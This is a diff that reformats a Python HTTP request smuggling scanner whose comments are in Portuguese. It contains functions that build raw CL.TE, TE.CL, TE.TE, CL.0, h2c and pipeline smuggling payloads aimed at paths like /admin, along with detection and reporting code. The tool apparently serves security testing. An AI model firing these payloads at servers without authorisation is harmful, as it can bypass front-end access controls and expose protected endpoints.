@@ -216,8 +216,16 @@ def _build_clte_payload(
 ) -> bytes:
     """Constrói payload CL.TE: front-end usa CL, back-end usa TE."""
     smuggled_host = smuggled_host or host
-    smuggled = b"0\r\n\r\n" + f"{method} {smuggled_path} HTTP/1.1\r\n".encode() + f"Host: {smuggled_host}\r\n".encode() + b"X-Smuggled: CLTE\r\n" + b"\r\n"
-    request = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n").encode() + smuggled
+    smuggled = (
+        b"0\r\n\r\n"
+        + f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
+        + f"Host: {smuggled_host}\r\n".encode()
+        + b"X-Smuggled: CLTE\r\n"
+        + b"\r\n"
+    )
+    request = (
+        f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n"
+    ).encode() + smuggled
     return request
 
 
@@ -230,8 +238,16 @@ def _build_tecl_payload(
 ) -> bytes:
     """Constrói payload TE.CL: front-end usa TE, back-end usa CL."""
     smuggled_host = smuggled_host or host
-    smuggled = b"0\r\n\r\n" + f"{method} {smuggled_path} HTTP/1.1\r\n".encode() + f"Host: {smuggled_host}\r\n".encode() + b"X-Smuggled: TECL\r\n" + b"\r\n"
-    request = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n").encode() + smuggled
+    smuggled = (
+        b"0\r\n\r\n"
+        + f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
+        + f"Host: {smuggled_host}\r\n".encode()
+        + b"X-Smuggled: TECL\r\n"
+        + b"\r\n"
+    )
+    request = (
+        f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n"
+    ).encode() + smuggled
     return request
 
 
@@ -244,8 +260,16 @@ def _build_tete_duplicate(
 ) -> bytes:
     """Constrói payload TE.TE com TE duplicado."""
     smuggled_host = smuggled_host or host
-    smuggled = b"0\r\n\r\n" + f"{method} {smuggled_path} HTTP/1.1\r\n".encode() + f"Host: {smuggled_host}\r\n".encode() + b"X-Smuggled: TETE_DUP\r\n" + b"\r\n"
-    request = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n").encode() + smuggled
+    smuggled = (
+        b"0\r\n\r\n"
+        + f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
+        + f"Host: {smuggled_host}\r\n".encode()
+        + b"X-Smuggled: TETE_DUP\r\n"
+        + b"\r\n"
+    )
+    request = (
+        f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n"
+    ).encode() + smuggled
     return request
 
 
@@ -258,8 +282,16 @@ def _build_tete_obfuscation(
 ) -> bytes:
     """Constrói payload TE.TE com obfuscação (x, chunked)."""
     smuggled_host = smuggled_host or host
-    smuggled = b"0\r\n\r\n" + f"{method} {smuggled_path} HTTP/1.1\r\n".encode() + f"Host: {smuggled_host}\r\n".encode() + b"X-Smuggled: TETE_OBF\r\n" + b"\r\n"
-    request = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: x, chunked\r\n\r\n").encode() + smuggled
+    smuggled = (
+        b"0\r\n\r\n"
+        + f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
+        + f"Host: {smuggled_host}\r\n".encode()
+        + b"X-Smuggled: TETE_OBF\r\n"
+        + b"\r\n"
+    )
+    request = (
+        f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: x, chunked\r\n\r\n"
+    ).encode() + smuggled
     return request
 
 
@@ -272,8 +304,16 @@ def _build_tete_whitespace(
 ) -> bytes:
     """Constrói payload TE.TE com whitespace no header."""
     smuggled_host = smuggled_host or host
-    smuggled = b"0\r\n\r\n" + f"{method} {smuggled_path} HTTP/1.1\r\n".encode() + f"Host: {smuggled_host}\r\n".encode() + b"X-Smuggled: TETE_WS\r\n" + b"\r\n"
-    request = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding : chunked\r\n\r\n").encode() + smuggled
+    smuggled = (
+        b"0\r\n\r\n"
+        + f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
+        + f"Host: {smuggled_host}\r\n".encode()
+        + b"X-Smuggled: TETE_WS\r\n"
+        + b"\r\n"
+    )
+    request = (
+        f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding : chunked\r\n\r\n"
+    ).encode() + smuggled
     return request
 
 
@@ -287,8 +327,19 @@ def _build_chunked_cl_payload(
     """Constrói payload Chunked+CL: chunked com CL conflitante."""
     smuggled_host = smuggled_host or host
     body = b"0\r\n\r\n"
-    smuggled = f"{method} {smuggled_path} HTTP/1.1\r\n".encode() + f"Host: {smuggled_host}\r\n".encode() + b"X-Smuggled: CHUNKED_CL\r\n" + b"\r\n"
-    request = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n").encode() + body + smuggled
+    smuggled = (
+        f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
+        + f"Host: {smuggled_host}\r\n".encode()
+        + b"X-Smuggled: CHUNKED_CL\r\n"
+        + b"\r\n"
+    )
+    request = (
+        (
+            f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n"
+        ).encode()
+        + body
+        + smuggled
+    )
     return request
 
 
@@ -298,7 +349,9 @@ def _build_pipeline_payload(
     smuggled_path: str = "/admin",
 ) -> bytes:
     """Constrói payload Pipeline: dois requests em sequência."""
-    request = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\nGET {smuggled_path} HTTP/1.1\r\nHost: {host}\r\nX-Smuggled: PIPELINE\r\n\r\n").encode()
+    request = (
+        f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\nGET {smuggled_path} HTTP/1.1\r\nHost: {host}\r\nX-Smuggled: PIPELINE\r\n\r\n"
+    ).encode()
     return request
 
 
@@ -311,8 +364,16 @@ def _build_cl0_payload(
 ) -> bytes:
     """Constrói payload CL.0: Content-Length: 0 com body smuggleado."""
     smuggled_host = smuggled_host or host
-    smuggled = b"0\r\n\r\n" + f"{method} {smuggled_path} HTTP/1.1\r\n".encode() + f"Host: {smuggled_host}\r\n".encode() + b"X-Smuggled: CL0\r\n" + b"\r\n"
-    request = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 0\r\n\r\n").encode() + smuggled
+    smuggled = (
+        b"0\r\n\r\n"
+        + f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
+        + f"Host: {smuggled_host}\r\n".encode()
+        + b"X-Smuggled: CL0\r\n"
+        + b"\r\n"
+    )
+    request = (
+        f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 0\r\n\r\n"
+    ).encode() + smuggled
     return request
 
 
@@ -325,7 +386,12 @@ def _build_h2c_payload(
 ) -> bytes:
     """Constrói payload h2c_upgrade: HTTP/1.1 com Upgrade: h2c."""
     smuggled_host = smuggled_host or host
-    smuggled = f"{method} {smuggled_path} HTTP/1.1\r\n".encode() + f"Host: {smuggled_host}\r\n".encode() + b"X-Smuggled: H2C\r\n" + b"\r\n"
+    smuggled = (
+        f"{method} {smuggled_path} HTTP/1.1\r\n".encode()
+        + f"Host: {smuggled_host}\r\n".encode()
+        + b"X-Smuggled: H2C\r\n"
+        + b"\r\n"
+    )
     request = (
         f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nUpgrade: h2c\r\nConnection: Upgrade\r\nContent-Length: {len(smuggled)}\r\n\r\n"
     ).encode() + smuggled
@@ -648,7 +714,9 @@ async def _test_chunked_cl(
                 _status, response = _send_raw(sock, request, timeout)
                 elapsed = time.monotonic() - t0
                 resp_differs = _check_response_differs(b"", response)
-                vuln, details = _check_smuggled_response(response, "X-Smuggled: CHUNKED_CL")
+                vuln, details = _check_smuggled_response(
+                    response, "X-Smuggled: CHUNKED_CL"
+                )
 
                 if not vuln and elapsed > 2.0:
                     vuln = True
@@ -730,7 +798,9 @@ async def _test_pipeline(
                 _status, response = _send_raw(sock, request, timeout)
                 elapsed = time.monotonic() - t0
                 resp_differs = _check_response_differs(b"", response)
-                vuln, details = _check_smuggled_response(response, "X-Smuggled: PIPELINE")
+                vuln, details = _check_smuggled_response(
+                    response, "X-Smuggled: PIPELINE"
+                )
 
                 # Pipeline desync: se recebemos duas respostas, pode haver desync
                 response_count = response.count(b"HTTP/1.1 ")
@@ -1141,7 +1211,9 @@ async def _test_h2c(
             resp_differs = _check_response_differs(b"", response_data)
             vuln = accepted
             details = (
-                f"Server accepted HTTP/1.1 UA on H2 stream ({response_data[:100]})" if accepted else "Server rejected or did not process HTTP/1.1 UA on H2"
+                f"Server accepted HTTP/1.1 UA on H2 stream ({response_data[:100]})"
+                if accepted
+                else "Server rejected or did not process HTTP/1.1 UA on H2"
             )
 
             if not vuln and elapsed > 2.0:
@@ -1199,7 +1271,9 @@ async def _test_h2c(
 
 # ─── Dispatch ────────────────────────────────────────────────────────────────
 
-_CATEGORY_DISPATCH: dict[str, Callable[..., Coroutine[Any, Any, list[SmuggleAttempt]]]] = {
+_CATEGORY_DISPATCH: dict[
+    str, Callable[..., Coroutine[Any, Any, list[SmuggleAttempt]]]
+] = {
     "cl_te": _test_cl_te,
     "te_cl": _test_te_cl,
     "te_te": _test_te_te,
@@ -1218,8 +1292,14 @@ def print_results(result: SmuggleResult) -> None:
     print()
     print(color("[*]", Cyber.CYAN, Cyber.BOLD), "HTTP Request Smuggling Test")
     print(color("[*]", Cyber.CYAN), f"Target: {result.target}")
-    print(color("[*]", Cyber.CYAN), f"Host: {result.host}:{result.port} (TLS: {result.tls})")
-    print(color("[*]", Cyber.CYAN), f"Baseline: HTTP {result.baseline_status} ({result.baseline_size} bytes)")
+    print(
+        color("[*]", Cyber.CYAN),
+        f"Host: {result.host}:{result.port} (TLS: {result.tls})",
+    )
+    print(
+        color("[*]", Cyber.CYAN),
+        f"Baseline: HTTP {result.baseline_status} ({result.baseline_size} bytes)",
+    )
     print()
 
     if result.issues:
@@ -1236,7 +1316,10 @@ def print_results(result: SmuggleResult) -> None:
     for cat, attempts in categories.items():
         vuln_in_cat = [a for a in attempts if a.vulnerable]
         if vuln_in_cat:
-            print(color("[!]", Cyber.RED, Cyber.BOLD), f"{cat}: {len(vuln_in_cat)} vulnerable(s)")
+            print(
+                color("[!]", Cyber.RED, Cyber.BOLD),
+                f"{cat}: {len(vuln_in_cat)} vulnerable(s)",
+            )
             for a in vuln_in_cat:
                 print(color("    [-]", Cyber.RED), f"{a.technique}: {a.details}")
                 print_exploit_info(a.exploit, a.tool)
@@ -1245,7 +1328,10 @@ def print_results(result: SmuggleResult) -> None:
 
     print()
     if result.overall_status == "vulnerable":
-        print(color("[!]", Cyber.RED, Cyber.BOLD), "VULNERABLE — HTTP Request Smuggling possible!")
+        print(
+            color("[!]", Cyber.RED, Cyber.BOLD),
+            "VULNERABLE — HTTP Request Smuggling possible!",
+        )
     else:
         print(color("[+]", Cyber.GREEN, Cyber.BOLD), "SECURE — No smuggling detected")
     print()
@@ -1289,7 +1375,11 @@ async def run_scan(
 
     # Classifica resultados
     vuln_techs = [a.technique for a in all_attempts if a.vulnerable]
-    blocked_techs = [a.technique for a in all_attempts if not a.vulnerable and a.error and "connection" in a.error.lower()]
+    blocked_techs = [
+        a.technique
+        for a in all_attempts
+        if not a.vulnerable and a.error and "connection" in a.error.lower()
+    ]
 
     # Issues
     issues: list[str] = []
